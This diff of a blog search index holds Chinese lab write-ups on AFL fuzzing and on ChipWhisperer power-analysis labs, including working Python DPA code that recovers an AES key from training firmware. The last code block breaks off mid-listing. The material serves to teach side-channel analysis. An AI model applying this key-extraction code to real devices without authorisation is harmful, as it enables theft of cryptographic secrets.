-<p><code>strings file | grep &quot;afl&quot;</code>检查下是否插桩成功，字符串中有afl结合前面编译安装没有报错说明应该插桩成功了</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081cnef3j20lm0l4goi.jpg" alt="image-20220306153619409"></p>
-<p>创建input、output文件夹，测试项目的tests文件下有输入文件，我们把它们转到input中当作种子，然后就可以用afl去fuzzing了</p>
-<p><code>afl-fuzz -i input -o output -m none -t 500+ -- /home/re1own/Project/install/bin/file @@</code></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0081d4vn0j21c00u07bt.jpg" alt="image-20220306155011256"></p>
-<p>实验相关文件链接：<a href="https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41">https://github.com/Re1own/IoT_Sec/tree/main/Fuzz/openEuler/file-5.41</a></p>
-]]></content>
-      <tags>
-        <tag>fuzz</tag>
-        <tag>OpenEuler</tag>
       </tags>
   </entry>
   <entry>
@@ -2090,6 +2090,125 @@
       </tags>
   </entry>
   <entry>
+    <title>测信道攻击——Hamming Weight Swings</title>
+    <url>/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94Hamming-Weight-Swings/</url>
+    <content><![CDATA[<p>实验：以Hamming Weight为标准，对不同数据进行AES加密能耗的差别</p>
+<p>Hamming Weight：二进制数中包含’1’的个数</p>
+<p>我们作出一个假设：data line上的比特位会消耗可测量的功耗。</p>
+<p>对0x00（包含0个1）和0xff（包含8个1）这两个权重很极端的数据进行测试，设置trace的量为100，当设备运行AES算法时，对这两个文本加密，如果假设正确，那么在高权重和低权重的功耗曲线上能观察到可测量的差异。目前，这些功耗曲线都混在一起了。将它们分成两组：one_list和zero_list。检查第一个字节来检查是否为0x00，并假设如果不是0x00就是0xFF。以下是一个简单的迭代循环来打印它们：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ktp = cw.ktp.Basic()</span><br><span class="line">trace_array = []</span><br><span class="line">textin_array = []</span><br><span class="line"></span><br><span class="line">key, text = ktp.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">target.set_key(key)</span><br><span class="line"></span><br><span class="line">N = <span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tnrange(N, desc=<span class="string">&#x27;Capturing traces&#x27;</span>):</span><br><span class="line">    scope.arm()</span><br><span class="line">    <span class="keyword">if</span> text[<span class="number">0</span>] &amp; <span class="number">0x01</span>:</span><br><span class="line">        text[<span class="number">0</span>] = <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text[<span class="number">0</span>] = <span class="number">0x00</span></span><br><span class="line">    target.simpleserial_write(<span class="string">&#x27;p&#x27;</span>, text)</span><br><span class="line">    </span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target timed out!&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    response = target.simpleserial_read(<span class="string">&#x27;r&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    trace_array.append(scope.get_last_trace())</span><br><span class="line">    textin_array.append(text)</span><br><span class="line">    </span><br><span class="line">    key, text = ktp.<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>
+
+<p>将数据分为两组，并将结果转为numpy array类型</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">zero_list=[]</span><br><span class="line">one_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(trace_array)):</span><br><span class="line">    <span class="keyword">if</span> textin_array[i][<span class="number">0</span>] == <span class="number">0x00</span>:</span><br><span class="line">        zero_list.append(trace_array[i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_list.append(trace_array[i])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_list=np.array(one_list)</span><br><span class="line">zero_list=np.array(zero_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(one_list) &gt; <span class="built_in">len</span>(zero_list)/<span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(zero_list) &gt; <span class="built_in">len</span>(one_list)/<span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对两组数据用np.mean求均值，得到zero_avg和one_avg</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trace_length = <span class="built_in">len</span>(one_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Traces had original sample length of %d&quot;</span>%trace_length)</span><br><span class="line"></span><br><span class="line">one_avg=np.mean(one_list, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(one_avg) != trace_length:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Average length is only %d - check you did correct dimensions!&quot;</span>%one_avg)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trace_length = <span class="built_in">len</span>(zero_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Traces had original sample length of %d&quot;</span>%trace_length)</span><br><span class="line"></span><br><span class="line">zero_avg=np.mean(zero_list, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(zero_avg) != trace_length:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;Average length is only %d - check you did correct dimensions!&quot;</span>%zero_avg)</span><br></pre></td></tr></table></figure>
+
+<p>用图形表示两组的差异</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">diff = one_avg[:<span class="number">1000</span>] - zero_avg[:<span class="number">1000</span>]</span><br><span class="line"></span><br><span class="line">plt.plot(<span class="built_in">abs</span>(diff))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<p>在100的位置可以看到一个明显的峰值，其余部分的差异都非常小</p>
+<img src="https://re1own.github.io/assets/img/测信道攻击——Hamming-Weight-Swings/image-20230525003148705.png" alt="image-20230525003148705" style="zoom:50%;">
+
+<p>把trace换成1000，发现还是在100的时候变化最大，那么那个点可能就是在aes加密的节点</p>
+<img src="https://re1own.github.io/assets/img/测信道攻击——Hamming-Weight-Swings/image-20230525004414856.png" alt="image-20230525004414856" style="zoom:50%;">
+
+
+
+<p>Reference</p>
+<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
+]]></content>
+      <tags>
+        <tag>SCA</tag>
+        <tag>Power Analysis Attack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>测信道攻击——用DPA攻击固件中的AES</title>
+    <url>/2023/05/26/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E7%94%A8DPA%E6%94%BB%E5%87%BB%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84AES/</url>
+    <content><![CDATA[<p>上篇攻击AES的方法其实属于SPA，本实验用更牛逼的方法，DPA来攻击AES，而且是货真价实的AES。关于DPA，我前面有篇博客有所讲解（<a href="https://re1own.github.io/2023/05/20/SCA/">初识测信道攻击</a>)。下面开始环境配置，这里需要注意的是，notebook中给出的SS_VER是’SS_VER_1_1’，我运行后总是失败，换成前面实验用的SS_VER_2_1就好了。这里编译、上传固件、安装就不多解释了，与之前实验一致。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCOPETYPE = &#x27;OPENADC&#x27;</span><br><span class="line">PLATFORM = &#x27;CWLITEARM&#x27;</span><br><span class="line">CRYPTO_TARGET=&#x27;TINYAES128C&#x27;</span><br><span class="line">SS_VER=&#x27;SS_VER_2_1&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%run &quot;../../Setup_Scripts/Setup_Generic.ipynb&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%%bash -s <span class="string">&quot;<span class="variable">$PLATFORM</span>&quot;</span> <span class="string">&quot;<span class="variable">$CRYPTO_TARGET</span>&quot;</span> <span class="string">&quot;<span class="variable">$SS_VER</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> ../../../hardware/victims/firmware/simpleserial-aes</span><br><span class="line">make PLATFORM=<span class="variable">$1</span> CRYPTO_TARGET=<span class="variable">$2</span> SS_VER=<span class="variable">$3</span> -j</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.program_target(scope, prog, &quot;../../../hardware/victims/firmware/simpleserial-aes/simpleserial-aes-&#123;&#125;.hex&quot;.format(PLATFORM))</span><br></pre></td></tr></table></figure>
+
+<p>抓取2500条能量迹</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ktp = cw.ktp.Basic()</span><br><span class="line">trace_array = []</span><br><span class="line">textin_array = []</span><br><span class="line"></span><br><span class="line">key, text = ktp.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">target.set_key(key)</span><br><span class="line"></span><br><span class="line">N = <span class="number">2500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tnrange(N, desc=<span class="string">&#x27;Capturing traces&#x27;</span>):</span><br><span class="line">    scope.arm()</span><br><span class="line">    </span><br><span class="line">    target.simpleserial_write(<span class="string">&#x27;p&#x27;</span>, text)</span><br><span class="line">    </span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target timed out!&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    response = target.simpleserial_read(<span class="string">&#x27;r&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    trace_array.append(scope.get_last_trace())</span><br><span class="line">    textin_array.append(text)</span><br><span class="line">    </span><br><span class="line">    key, text = ktp.<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>
+
+<p>在实验<a href="https://re1own.github.io/2023/05/25/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/">利用一个bit恢复AES key</a>中之所以能成功是攻击流中存在S-box。本次实验使用能量分析去破解AES密钥。之前的方法能生效是因为我们攻击的数据流就在S-box中，而实战中我们不知道数值，只知道能量消耗，要找到他们对应的二进制是比较困难的。而本攻击方式是利用S-box输出结果的一个bit（无论哪个都行）将能量分成两个部分（0和1），利用1消耗能量是大于0的，而且根据之前的实验，数据总线中数据的值与能量消耗之间有一定联系。DPA分析AES只需要整个能量迹包含了加密流程发生的时间段。</p>
+<p>S-box是固定的：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = [</span><br><span class="line">    <span class="comment"># 0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f </span></span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>, <span class="comment"># 0</span></span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>, <span class="comment"># 1</span></span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>, <span class="comment"># 2</span></span><br><span class="line">    <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>, <span class="comment"># 3</span></span><br><span class="line">    <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>, <span class="comment"># 4</span></span><br><span class="line">    <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>, <span class="comment"># 5</span></span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>, <span class="comment"># 6</span></span><br><span class="line">    <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>, <span class="comment"># 7</span></span><br><span class="line">    <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>, <span class="comment"># 8</span></span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>, <span class="comment"># 9</span></span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>, <span class="comment"># a</span></span><br><span class="line">    <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>, <span class="comment"># b</span></span><br><span class="line">    <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>, <span class="comment"># c</span></span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>, <span class="comment"># d</span></span><br><span class="line">    <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>, <span class="comment"># e</span></span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>  <span class="comment"># f</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_internal</span>(<span class="params">inputdata, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sbox[inputdata ^ key]</span><br></pre></td></tr></table></figure>
+
+<p>0，1两组对比的能量线</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pylab <span class="keyword">as</span> plt</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(trace_array[<span class="number">0</span>])</span><br><span class="line">plt.plot(trace_array[<span class="number">1</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527014113362.png" alt="image-20230527014113362" style="zoom:50%;">
+
+<p>查看输入数据</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(textin_array[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(textin_array[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CWbytearray(<span class="string">b&#x27;39 79 82 4f 97 0e a3 b9 1d 07 14 78 df 3c a7 89&#x27;</span>)</span><br><span class="line">CWbytearray(<span class="string">b&#x27;c7 81 5d dd fe e3 29 b5 b4 3e 53 17 6f b3 37 4e&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>定义能量迹的数量和每条能量迹的点的数量</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numtraces = np.shape(trace_array)[<span class="number">0</span>] <span class="comment">#total number of traces</span></span><br><span class="line">numpoints = np.shape(trace_array)[<span class="number">1</span>] <span class="comment">#samples per trace</span></span><br></pre></td></tr></table></figure>
+
+<p>对两组能量迹取平均值，再取两者差的绝对值，看谁最大谁就最可能是密钥了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">guess_byte = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">    one_list = []</span><br><span class="line">    zero_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> trace_index <span class="keyword">in</span> <span class="built_in">range</span>(numtraces):</span><br><span class="line">    </span><br><span class="line">        input_byte = textin_array[trace_index][guess_byte]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Get a hypothetical leakage list - use aes_internal(guess, input_byte)     </span></span><br><span class="line">        hypothetical_leakage = aes_internal(guess, input_byte)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hypothetical_leakage &amp; <span class="number">0x01</span>) == <span class="number">1</span>:</span><br><span class="line">            one_list.append(trace_array[trace_index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zero_list.append(trace_array[trace_index])</span><br><span class="line">            </span><br><span class="line">    one_avg = np.mean(np.array(one_list), axis = <span class="number">0</span>)</span><br><span class="line">    zero_avg = np.mean(np.array(zero_list), axis = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    max_diff_value = <span class="built_in">max</span>(<span class="built_in">abs</span>(one_avg -zero_avg))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Guessing &#123;:02x&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(guess, max_diff_value))</span><br></pre></td></tr></table></figure>
+
+<p>发现0x2b最大，即2b为key的第一个字节</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guessing 00: 0.0016756559017779837</span><br><span class="line">Guessing 01: 0.0016902979846054461</span><br><span class="line">Guessing 02: 0.0015728231728371483</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guessing 2a: 0.0015339731742831531</span><br><span class="line">Guessing 2b: 0.0059058167148595825</span><br><span class="line">Guessing 2c: 0.0016990212661401327</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guessing fe: 0.0014141100475279222</span><br><span class="line">Guessing ff: 0.002171968556943134</span><br></pre></td></tr></table></figure>
+
+<p>计算差异的函数，也用来解决幽灵峰问题</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_diffs</span>(<span class="params">guess, byteindex=<span class="number">0</span>, bitnum=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Perform a simple DPA on two traces, uses global `textin_array` and `trace_array` &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    one_list = []</span><br><span class="line">    zero_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> trace_index <span class="keyword">in</span> <span class="built_in">range</span>(numtraces):</span><br><span class="line">        hypothetical_leakage = aes_internal(guess, textin_array[trace_index][byteindex])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Mask off the requested bit</span></span><br><span class="line">        <span class="keyword">if</span> hypothetical_leakage &amp; (<span class="number">1</span>&lt;&lt;bitnum):</span><br><span class="line">            one_list.append(trace_array[trace_index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zero_list.append(trace_array[trace_index])</span><br><span class="line"></span><br><span class="line">    one_avg = np.asarray(one_list).mean(axis=<span class="number">0</span>)</span><br><span class="line">    zero_avg = np.asarray(zero_list).mean(axis=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(one_avg - zero_avg)</span><br></pre></td></tr></table></figure>
+
+<p>查看不同key对应的差异图</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.plot(calculate_diffs(0x2B)) * cw.plot(calculate_diffs(0x2C)) * cw.plot(calculate_diffs(0x2D))</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527040527620.png" alt="image-20230527040527620" style="zoom:50%;">
+
+<p>最后就是把剩下的字节都猜了，补全代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#Store your key_guess here, compare to known_key</span></span><br><span class="line">key_guess = []</span><br><span class="line">known_key = [<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>, <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> subkey <span class="keyword">in</span> tnrange(<span class="number">0</span>, <span class="number">16</span>, desc=<span class="string">&quot;Attacking Subkey&quot;</span>):</span><br><span class="line">    max_list=[]</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        max_diff_value = <span class="built_in">max</span>(calculate_diffs(guess, subkey))</span><br><span class="line">        max_list.append(max_diff_value)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Subkey &#123;&#125; - most likelv &#123;:02x&#125; (actual &#123;:02x&#125;)&#x27;</span>.<span class="built_in">format</span>(subkey,np.argsort(max_list)[::-<span class="number">1</span>][<span class="number">0</span>], known_key[subkey]))</span><br></pre></td></tr></table></figure>
+
+<p>结果来看都猜对了！</p>
+<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527041126582.png" alt="image-20230527041126582" style="zoom:50%;">
+
+<p>我这次实验是成功了，但也有一些情况是没有成功的，下面是关于DPA攻击失败的一些问题以及解决方式</p>
+<ul>
+<li>抓取的是幽灵峰的话可以尝试增加抓取的能量迹数量</li>
+<li>修改攻击的目标位数，如最低位改为第三位，或者把很多位的结果都跑一下综合一下</li>
+</ul>
+<p>如何解决幽灵峰的问题</p>
+<p>先运行下这段准备好的DPA攻击代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#Store your key_guess here, compare to known_key</span></span><br><span class="line">key_guess = []</span><br><span class="line">known_key = [<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>, <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Which bit to target</span></span><br><span class="line">bitnum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">full_diffs_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> subkey <span class="keyword">in</span> tnrange(<span class="number">0</span>, <span class="number">1</span>, desc=<span class="string">&quot;Attacking Subkey&quot;</span>):</span><br><span class="line">    </span><br><span class="line">    max_diffs = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    full_diffs = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        full_diff_trace = calculate_diffs(guess, subkey, bitnum)</span><br><span class="line">        max_diffs[guess] = np.<span class="built_in">max</span>(full_diff_trace)</span><br><span class="line">        full_diffs[guess] = full_diff_trace</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Make copy of the list</span></span><br><span class="line">    